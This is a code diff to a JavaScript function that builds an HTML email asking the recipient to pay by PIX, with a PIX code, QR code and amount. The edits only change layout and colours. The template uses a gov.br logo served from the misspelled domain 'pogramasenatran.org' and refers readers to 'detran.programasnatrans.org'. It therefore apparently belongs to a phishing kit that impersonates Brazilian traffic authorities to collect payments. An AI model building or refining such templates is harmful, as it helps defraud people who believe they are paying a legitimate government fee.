@@ -71,11 +71,17 @@ function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transact
   const footerLogo = process.env.PIX_EMAIL_FOOTER_LOGO || "https://assets.pogramasenatran.org/govbr-logo.png";
 
   return `
-  <div style="margin:0; padding:0; background:linear-gradient(180deg,#e8eff7 0%, #f4f7fb 45%, #eef3f8 100%); font-family:Arial, Helvetica, sans-serif; color:#0b0b0b; line-height:1.4;">
-    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background:linear-gradient(180deg,#e8eff7 0%, #f4f7fb 45%, #eef3f8 100%); padding:24px 12px;">
+  <div style="margin:0; padding:0; background:#e9f1fb; font-family:Arial, Helvetica, sans-serif; color:#0b0b0b; line-height:1.4;">
+    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background:#e9f1fb;">
       <tr>
-        <td align="center">
-          <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
+        <td style="background:#dbe6f5; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="background:#e9f1fb; padding:0 12px;">
+          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
+            <tr>
+              <td align="center">
+                <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
             <tr>
               <td style="background:#0b2a57; padding:18px 20px;">
                 <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
@@ -167,8 +173,14 @@ function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transact
                 Em caso de dúvidas, acesse detran.programasnatrans.org
               </td>
             </tr>
+                </table>
+              </td>
+            </tr>
           </table>
         </td>
+      </tr>
+      <tr>
+        <td style="background:#f4f7fb; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
       </tr>
     </table>
   </div>
